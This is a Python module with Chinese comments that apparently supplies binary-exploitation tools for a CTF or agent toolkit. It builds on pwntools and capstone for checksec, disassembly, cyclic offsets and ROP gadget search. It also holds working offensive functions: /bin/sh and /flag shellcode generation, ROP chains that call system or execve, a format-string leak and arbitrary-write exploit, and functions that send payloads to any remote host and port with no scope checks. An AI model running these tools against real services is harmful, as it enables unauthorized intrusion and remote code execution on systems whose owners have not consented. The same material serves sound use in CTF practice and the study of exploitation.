import subprocess
import os
import sys
import socket
import struct
import logging
from typing import Dict, Any, Optional

logger = logging.getLogger(__name__)

# 检查 pwntools 是否可用
try:
    from pwn import ELF, cyclic, cyclic_find, context, remote, fmtstr_payload, asm
    from pwnlib import rop, shellcraft
    PWNTOOLS_AVAILABLE = True
except ImportError:
    PWNTOOLS_AVAILABLE = False
    logger.warning("pwntools 未安装，PWN工具功能受限。请运行: pip install pwntools")

# 检查 capstone 是否可用（用于反汇编后备）
try:
    from capstone import Cs, CS_ARCH_X86, CS_MODE_32, CS_MODE_64
    CAPSTONE_AVAILABLE = True
except ImportError:
    CAPSTONE_AVAILABLE = False


def _check_pwntools() -> Dict[str, Any]:
    if not PWNTOOLS_AVAILABLE:
        return {
            "success": False,
            "error": "pwntools 未安装，请运行: pip install pwntools"
        }
    return None


async def pwn_checksec(binary_path: str) -> Dict[str, Any]:
    """检查二进制文件的安全保护机制（NX, PIE, Canary, RELRO等）"""
    err = _check_pwntools()
    if err:
        return err

    if not os.path.exists(binary_path):
        return {"success": False, "error": f"文件不存在: {binary_path}"}

    try:
        elf = ELF(binary_path, checksec=False)
        result = {
            "success": True,
            "binary": binary_path,
            "arch": elf.arch,
            "bits": elf.bits,
            "endian": elf.endian,
            "protections": {
                "RELRO": elf.relro if hasattr(elf, 'relro') else "Unknown",
                "StackCanary": elf.canary,
                "NX": elf.nx,
                "PIE": elf.pie,
            },
            "entry_point": hex(elf.entry),
            "sections": [s.name for s in elf.sections if s.name],
            "symbols_count": len(elf.symbols),
        }

        # 列出关键函数地址
        key_funcs = ['main', 'system', 'execve', 'puts', 'gets', 'read',
                     'write', 'open', 'mprotect', 'scanf', 'strcpy', 'strcat',
                     'sprintf', 'memcpy', 'free', 'malloc']
        func_addrs = {}
        for func_name in key_funcs:
            if func_name in elf.symbols:
                func_addrs[func_name] = hex(elf.symbols[func_name])
        result["key_functions"] = func_addrs

        # 列出 PLT 表（使用 elf.get_section_by_name 避免 unicorn 依赖）
        try:
            plt_section = elf.get_section_by_name('.plt')
            if plt_section:
                # 通过符号表查找 PLT 入口
                result["plt"] = {}
                for name, addr in elf.plt.items():
                    result["plt"][name] = hex(addr)
                if not result["plt"]:
                    # 手动查找 PLT 入口（通过 .rela.plt）
                    rela_plt = elf.get_section_by_name('.rela.plt')
                    if rela_plt:
                        import lief
                        # 不依赖 lief，用简单方法
                        result["plt_note"] = "PLT section exists but entries require unicorn. Use objdump -R to view."
        except Exception:
            result["plt_note"] = "PLT extraction failed (unicorn not available)"

        # 列出 GOT 表
        try:
            if hasattr(elf, 'got') and elf.got:
                result["got"] = {k: hex(v) for k, v in elf.got.items()}
        except Exception:
            result["got_note"] = "GOT extraction failed"

        return result
    except Exception as e:
        return {"success": False, "error": f"checksec失败: {str(e)}"}


async def pwn_file_info(binary_path: str) -> Dict[str, Any]:
    """获取二进制文件基本信息（类型、架构、链接方式等）"""
    if not os.path.exists(binary_path):
        return {"success": False, "error": f"文件不存在: {binary_path}"}

    result = {"success": True, "binary": binary_path}

    # 使用 file 命令
    try:
        completed = subprocess.run(
            ["file", binary_path],
            capture_output=True, text=True, timeout=10
        )
        result["file_type"] = completed.stdout.strip()
    except Exception as e:
        result["file_error"] = str(e)

    # 使用 strings 提取关键信息
    try:
        completed = subprocess.run(
            ["strings", "-n", "6", binary_path],
            capture_output=True, text=True, timeout=15
        )
        all_strings = completed.stdout.strip().split('\n')
        # 过滤可能有用的字符串
        interesting_keywords = ['flag', 'shell', 'bin/sh', 'system', 'password',
                                'secret', 'admin', 'login', 'cat', '/bin',
                                'echo', 'libc', 'glibc', 'menu', 'choice',
                                'input', 'name', 'buf', 'overflow', 'vuln']
        interesting_strings = []
        for s in all_strings:
            s_lower = s.lower()
            for kw in interesting_keywords:
                if kw in s_lower:
                    interesting_strings.append(s)
                    break
        result["interesting_strings"] = interesting_strings[:50]
        result["total_strings"] = len(all_strings)
    except Exception as e:
        result["strings_error"] = str(e)

    # 如果 pwntools 可用，补充架构信息
    if PWNTOOLS_AVAILABLE:
        try:
            elf = ELF(binary_path, checksec=False)
            result["arch"] = elf.arch
            result["bits"] = elf.bits
            result["endian"] = elf.endian
            result["entry"] = hex(elf.entry)
        except Exception:
            pass

    return result


async def pwn_disassemble(binary_path: str, function_name: str = "", address: str = "", count: int = 50) -> Dict[str, Any]:
    """反汇编二进制文件的指定函数或地址区域"""
    err = _check_pwntools()
    if err:
        return err

    if not os.path.exists(binary_path):
        return {"success": False, "error": f"文件不存在: {binary_path}"}

    try:
        elf = ELF(binary_path, checksec=False)

        if function_name:
            if function_name not in elf.symbols:
                return {"success": False, "error": f"函数 {function_name} 不存在于符号表中"}
            addr = elf.symbols[function_name]
        elif address:
            addr = int(address, 16) if address.startswith("0x") else int(address)
        else:
            addr = elf.entry

        # 尝试使用 pwntools 的 disasm（需要 objdump）
        try:
            disasm_code = elf.disasm(addr, count)
        except Exception:
            # 后备：使用 capstone 反汇编
            if not CAPSTONE_AVAILABLE:
                return {"success": False, "error": "反汇编需要 objdump(binutils) 或 capstone。请安装: pip install capstone 或 brew install binutils"}

            # 读取代码段数据
            code_data = elf.read(addr, count * 15)  # 每条指令最多15字节

            # 初始化 capstone
            if elf.bits == 64:
                md = Cs(CS_ARCH_X86, CS_MODE_64)
            else:
                md = Cs(CS_ARCH_X86, CS_MODE_32)

            disasm_lines = []
            for insn in md.disasm(code_data, addr):
                disasm_lines.append(f"  {hex(insn.address)}:\t{insn.mnemonic}\t{insn.op_str}")
                if len(disasm_lines) >= count:
                    break

            disasm_code = "\n".join(disasm_lines)

        return {
            "success": True,
            "binary": binary_path,
            "function": function_name or f"addr_{hex(addr)}",
            "address": hex(addr),
            "disassembly": disasm_code
        }
    except Exception as e:
        return {"success": False, "error": f"反汇编失败: {str(e)}"}


async def pwn_pattern_create(length: int = 200) -> Dict[str, Any]:
    """生成循环模式用于缓冲区溢出偏移量计算"""
    err = _check_pwntools()
    if err:
        return err

    try:
        pattern = cyclic(length)
        return {
            "success": True,
            "pattern": pattern.decode('latin-1') if isinstance(pattern, bytes) else pattern,
            "pattern_hex": pattern.hex() if isinstance(pattern, bytes) else pattern.encode().hex(),
            "length": length
        }
    except Exception as e:
        return {"success": False, "error": f"生成pattern失败: {str(e)}"}


async def pwn_pattern_offset(value: str) -> Dict[str, Any]:
    """计算给定值在循环模式中的偏移量"""
    err = _check_pwntools()
    if err:
        return err

    try:
        # 尝试解析输入值
        if value.startswith("0x"):
            # 十六进制地址
            val = int(value, 16)
            # 可能需要考虑大小端
            offset_le = cyclic_find(struct.pack('<I', val))
            offset_be = cyclic_find(struct.pack('>I', val))
            return {
                "success": True,
                "value": value,
                "offset_little_endian": offset_le if offset_le != -1 else None,
                "offset_big_endian": offset_be if offset_be != -1 else None,
                "suggested_offset": offset_le if offset_le != -1 else offset_be
            }
        else:
            # 字符串模式
            offset = cyclic_find(value.encode('latin-1'))
            return {
                "success": True,
                "value": value,
                "offset": offset if offset != -1 else None
            }
    except Exception as e:
        return {"success": False, "error": f"计算偏移量失败: {str(e)}"}


async def pwn_rop_gadgets(binary_path: str, depth: int = 10) -> Dict[str, Any]:
    """搜索二进制文件中的ROP gadgets"""
    err = _check_pwntools()
    if err:
        return err

    if not os.path.exists(binary_path):
        return {"success": False, "error": f"文件不存在: {binary_path}"}

    try:
        elf = ELF(binary_path, checksec=False)

        # 尝试使用 pwntools ROP（需要 objdump）
        try:
            rop_obj = rop.ROP(elf)

            # 获取所有 gadgets
            gadgets = []
            for gadget in rop_obj.gadgets:
                g = rop_obj.gadgets[gadget]
                insns = '; '.join(g.insns)
                gadgets.append({
                    "address": hex(gadget),
                    "instructions": insns
                })

            # 查找常用 gadgets
            useful_gadgets = {}
            try:
                g = rop_obj.find_gadget(['pop rdi', 'ret'])
                useful_gadgets["pop_rdi"] = hex(g.address) if g else None
            except Exception:
                useful_gadgets["pop_rdi"] = None
            try:
                g = rop_obj.find_gadget(['pop rsi', 'ret'])
                useful_gadgets["pop_rsi"] = hex(g.address) if g else None
            except Exception:
                useful_gadgets["pop_rsi"] = None
            try:
                g = rop_obj.find_gadget(['pop rdx', 'ret'])
                useful_gadgets["pop_rdx"] = hex(g.address) if g else None
            except Exception:
                useful_gadgets["pop_rdx"] = None
            try:
                g = rop_obj.find_gadget(['ret'])
                useful_gadgets["ret"] = hex(g.address) if g else None
            except Exception:
                useful_gadgets["ret"] = None

            return {
                "success": True,
                "binary": binary_path,
                "total_gadgets": len(gadgets),
                "useful_gadgets": useful_gadgets,
                "all_gadgets": gadgets[:100]
            }
        except Exception:
            # 后备：使用 capstone 手动搜索 ret 指令前的 pop 序列
            if not CAPSTONE_AVAILABLE:
                return {"success": False, "error": "ROP搜索需要 objdump(binutils) 或 capstone。请安装: pip install capstone"}

            # 读取可执行段
            useful_gadgets = {}
            gadgets_found = []

            for section in elf.sections:
                if section.header['sh_flags'] & 0x4:  # SHF_EXECINSTR
                    code = section.data()
                    base = section.header['sh_addr']

                    if elf.bits == 64:
                        md = Cs(CS_ARCH_X86, CS_MODE_64)
                    else:
                        md = Cs(CS_ARCH_X86, CS_MODE_32)

                    # 搜索 ret (0xc3) 指令并回溯
                    insn_list = list(md.disasm(code, base))
                    for i, insn in enumerate(insn_list):
                        if insn.mnemonic == 'ret':
                            # 检查前1-3条指令是否为 pop
                            for back in range(1, min(4, i + 1)):
                                prev = insn_list[i - back]
                                if prev.mnemonic.startswith('pop'):
                                    gadget_addr = prev.address
                                    gadget_insns = '; '.join([f"{ins.mnemonic} {ins.op_str}".strip() for ins in insn_list[i-back:i+1]])
                                    gadgets_found.append({"address": hex(gadget_addr), "instructions": gadget_insns})

                                    # 记录有用的 gadgets
                                    if prev.mnemonic == 'pop' and 'rdi' in prev.op_str:
                                        useful_gadgets["pop_rdi"] = hex(gadget_addr)
                                    elif prev.mnemonic == 'pop' and 'rsi' in prev.op_str:
                                        useful_gadgets["pop_rsi"] = hex(gadget_addr)
                                    elif prev.mnemonic == 'pop' and 'rdx' in prev.op_str:
                                        useful_gadgets["pop_rdx"] = hex(gadget_addr)

                            if insn.address not in [g.get('address_int') for g in gadgets_found]:
                                useful_gadgets.setdefault("ret", hex(insn.address))

            return {
                "success": True,
                "binary": binary_path,
                "total_gadgets": len(gadgets_found),
                "useful_gadgets": useful_gadgets,
                "all_gadgets": gadgets_found[:100],
                "note": "使用capstone后备搜索（objdump不可用）"
            }
    except Exception as e:
        return {"success": False, "error": f"搜索ROP gadgets失败: {str(e)}"}


async def pwn_remote_exploit(host: str, port: int, payload: str, recv_timeout: int = 5) -> Dict[str, Any]:
    """连接远程PWN服务并发送payload，返回响应"""
    err = _check_pwntools()
    if err:
        # 降级使用原生socket
        return await _remote_exploit_socket(host, port, payload, recv_timeout)

    try:
        # 解析 payload（支持 hex 和 raw 格式）
        if payload.startswith("\\x") or all(c in '0123456789abcdefABCDEF' for c in payload.replace('\\x', '')):
            clean = payload.replace('\\x', '')
            payload_bytes = bytes.fromhex(clean)
        else:
            payload_bytes = payload.encode('latin-1')

        io = remote(host, port, timeout=recv_timeout)

        # 接收初始数据
        try:
            initial_data = io.recv(timeout=recv_timeout)
        except Exception:
            initial_data = b""

        # 发送 payload
        io.send(payload_bytes)

        # 接收响应
        try:
            response = io.recv(timeout=recv_timeout)
        except Exception:
            response = b""

        # 尝试交互模式接收更多数据
        try:
            more = io.recv(timeout=2)
            response += more
        except Exception:
            pass

        io.close()

        return {
            "success": True,
            "host": host,
            "port": port,
            "initial_data": initial_data.decode('latin-1', errors='replace') if initial_data else "",
            "response": response.decode('latin-1', errors='replace') if response else "",
            "payload_hex": payload_bytes.hex()
        }
    except Exception as e:
        return {"success": False, "error": f"远程利用失败: {str(e)}"}


async def _remote_exploit_socket(host: str, port: int, payload: str, recv_timeout: int = 5) -> Dict[str, Any]:
    """使用原生socket实现远程连接（pwntools不可用时的降级方案）"""
    try:
        if payload.startswith("\\x") or all(c in '0123456789abcdefABCDEF' for c in payload.replace('\\x', '')):
            clean = payload.replace('\\x', '')
            payload_bytes = bytes.fromhex(clean)
        else:
            payload_bytes = payload.encode('latin-1')

        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(recv_timeout)
        sock.connect((host, port))

        # 接收初始数据
        initial_data = b""
        try:
            initial_data = sock.recv(4096)
        except socket.timeout:
            pass

        # 发送 payload
        sock.sendall(payload_bytes)

        # 接收响应
        response = b""
        try:
            response = sock.recv(4096)
        except socket.timeout:
            pass

        sock.close()

        return {
            "success": True,
            "host": host,
            "port": port,
            "initial_data": initial_data.decode('latin-1', errors='replace') if initial_data else "",
            "response": response.decode('latin-1', errors='replace') if response else "",
            "payload_hex": payload_bytes.hex(),
            "note": "使用原生socket（pwntools未安装）"
        }
    except Exception as e:
        return {"success": False, "error": f"远程利用失败(socket): {str(e)}"}


async def pwn_remote_interact(host: str, port: int, commands: str = "", recv_timeout: int = 5) -> Dict[str, Any]:
    """连接远程PWN服务，发送多条命令并交互接收响应。
    commands参数为换行分隔的命令列表，每行一条命令。"""
    err = _check_pwntools()
    if err:
        return {"success": False, "error": "pwntools未安装，交互模式需要pwntools"}

    try:
        io = remote(host, port, timeout=recv_timeout)

        all_output = ""

        # 接收初始banner
        try:
            banner = io.recv(timeout=recv_timeout)
            all_output += banner.decode('latin-1', errors='replace')
        except Exception:
            pass

        # 逐条发送命令
        if commands:
            cmd_list = commands.strip().split('\n')
            for cmd in cmd_list:
                cmd = cmd.strip()
                if not cmd:
                    continue
                io.sendline(cmd.encode('latin-1'))
                try:
                    resp = io.recv(timeout=2)
                    all_output += resp.decode('latin-1', errors='replace')
                except Exception:
                    pass

        io.close()

        return {
            "success": True,
            "host": host,
            "port": port,
            "output": all_output
        }
    except Exception as e:
        return {"success": False, "error": f"交互失败: {str(e)}"}


async def pwn_shellcode_generate(arch: str = "amd64", os_name: str = "linux",
                                  shellcode_type: str = "sh", exec_cmd: str = "") -> Dict[str, Any]:
    """生成shellcode。
    arch: i386/amd64/arm/thumb
    shellcode_type: sh/exec/recv/cat_flag
    exec_cmd: 当shellcode_type为exec时指定要执行的命令"""
    err = _check_pwntools()
    if err:
        return err

    try:
        context.clear()
        context.arch = arch
        context.os = os_name

        sc = b""
        description = ""

        if shellcode_type == "sh":
            sc = shellcraft.sh()
            description = "执行 /bin/sh 的shellcode"
        elif shellcode_type == "exec":
            if exec_cmd:
                sc = shellcraft.execve(exec_cmd.split()[0], exec_cmd.split(), 0)
                description = f"执行命令 '{exec_cmd}' 的shellcode"
            else:
                return {"success": False, "error": "exec类型需要提供exec_cmd参数"}
        elif shellcode_type == "cat_flag":
            sc = shellcraft.cat("/flag")
            description = "读取 /flag 文件的shellcode"
        elif shellcode_type == "read_flag":
            sc = shellcraft.open("/flag") + shellcraft.read('eax', 'esp', 100) + shellcraft.write(1, 'esp', 100)
            description = "open+read+write读取/flag的shellcode"
        else:
            return {"success": False, "error": f"不支持的shellcode类型: {shellcode_type}"}

        # 编译为机器码
        machine_code = asm(sc)

        return {
            "success": True,
            "arch": arch,
            "os": os_name,
            "type": shellcode_type,
            "description": description,
            "assembly": sc,
            "machine_code_hex": machine_code.hex(),
            "machine_code_escaped": machine_code.decode('latin-1'),
            "length": len(machine_code)
        }
    except Exception as e:
        return {"success": False, "error": f"生成shellcode失败: {str(e)}"}


async def pwn_rop_chain(binary_path: str, func_name: str, args: str = "") -> Dict[str, Any]:
    """构建ROP链调用指定函数。
    func_name: 要调用的函数名(如system/execve)
    args: 函数参数，多个参数用逗号分隔(如 '/bin/sh' 或 '1,buf_addr,100')"""
    err = _check_pwntools()
    if err:
        return err

    if not os.path.exists(binary_path):
        return {"success": False, "error": f"文件不存在: {binary_path}"}

    try:
        elf = ELF(binary_path, checksec=False)
        rop_obj = rop.ROP(elf)

        # 解析参数
        arg_list = []
        if args:
            for arg in args.split(','):
                arg = arg.strip()
                if arg.startswith("0x"):
                    arg_list.append(int(arg, 16))
                elif arg.startswith("'") or arg.startswith('"'):
                    # 字符串参数，需要找到 binsh 地址或使用 next
                    str_val = arg.strip("'\"")
                    binsh = next(elf.search(str_val.encode()))
                    arg_list.append(binsh)
                elif arg.isdigit():
                    arg_list.append(int(arg))
                else:
                    # 尝试作为符号地址查找
                    if arg in elf.symbols:
                        arg_list.append(elf.symbols[arg])
                    else:
                        return {"success": False, "error": f"无法解析参数: {arg}"}

        if func_name not in elf.symbols and func_name not in elf.plt:
            return {"success": False, "error": f"函数 {func_name} 不存在于符号表或PLT中"}

        # 构建 ROP 链
        if arg_list:
            rop_obj.call(func_name, arg_list)
        else:
            rop_obj.call(func_name)

        chain = rop_obj.chain()

        return {
            "success": True,
            "binary": binary_path,
            "function": func_name,
            "args": args,
            "rop_chain_hex": chain.hex(),
            "rop_chain_escaped": chain.decode('latin-1'),
            "rop_dump": rop_obj.dump(),
            "length": len(chain)
        }
    except Exception as e:
        return {"success": False, "error": f"构建ROP链失败: {str(e)}"}


async def pwn_search_string(binary_path: str, search_string: str) -> Dict[str, Any]:
    """在二进制文件中搜索指定字符串，返回地址"""
    err = _check_pwntools()
    if err:
        return err

    if not os.path.exists(binary_path):
        return {"success": False, "error": f"文件不存在: {binary_path}"}

    try:
        elf = ELF(binary_path, checksec=False)
        search_bytes = search_string.encode('latin-1')

        addresses = []
        for addr in elf.search(search_bytes):
            addresses.append(hex(addr))

        return {
            "success": True,
            "binary": binary_path,
            "search_string": search_string,
            "found": len(addresses) > 0,
            "addresses": addresses
        }
    except Exception as e:
        return {"success": False, "error": f"搜索字符串失败: {str(e)}"}


async def pwn_fmtstr_exploit(host: str, port: int, offset: int, payload_type: str = "leak",
                              read_len: int = 100, write_addr: str = "",
                              write_val: str = "") -> Dict[str, Any]:
    """格式化字符串漏洞利用工具。
    offset: 格式化字符串参数的偏移量
    payload_type: leak(泄漏地址)/write(写任意地址)
    read_len: leak类型时读取的长度
    write_addr: write类型时目标地址(十六进制)
    write_val: write类型时写入的值(十六进制)"""
    err = _check_pwntools()
    if err:
        return {"success": False, "error": "pwntools未安装"}

    try:
        if payload_type == "leak":
            # 生成泄漏 payload: %p.%p.%p... 泄漏栈上的值
            payload = ".".join([f"%{offset + i}$p" for i in range(min(read_len // 10, 20))])
            payload += "\n"

            io = remote(host, port, timeout=5)
            try:
                banner = io.recv(timeout=2)
            except Exception:
                banner = b""

            io.send(payload.encode())

            try:
                response = io.recv(timeout=5)
            except Exception:
                response = b""

            io.close()

            return {
                "success": True,
                "payload": payload.strip(),
                "banner": banner.decode('latin-1', errors='replace'),
                "response": response.decode('latin-1', errors='replace'),
                "note": "使用%p泄漏栈上的指针值，用于分析内存布局"
            }

        elif payload_type == "write":
            if not write_addr or not write_val:
                return {"success": False, "error": "write类型需要提供write_addr和write_val参数"}

            target_addr = int(write_addr, 16)
            target_val = int(write_val, 16)

            # 使用 pwntools 的 fmtstr_payload
            payload = fmtstr_payload(offset, {target_addr: target_val})

            io = remote(host, port, timeout=5)
            try:
                banner = io.recv(timeout=2)
            except Exception:
                banner = b""

            io.send(payload)

            try:
                response = io.recv(timeout=5)
            except Exception:
                response = b""

            io.close()

            return {
                "success": True,
                "payload_hex": payload.hex(),
                "banner": banner.decode('latin-1', errors='replace'),
                "response": response.decode('latin-1', errors='replace'),
                "note": f"向地址 {write_addr} 写入值 {write_val}"
            }
        else:
            return {"success": False, "error": f"不支持的payload_type: {payload_type}"}
    except Exception as e:
        return {"success": False, "error": f"格式化字符串利用失败: {str(e)}"}
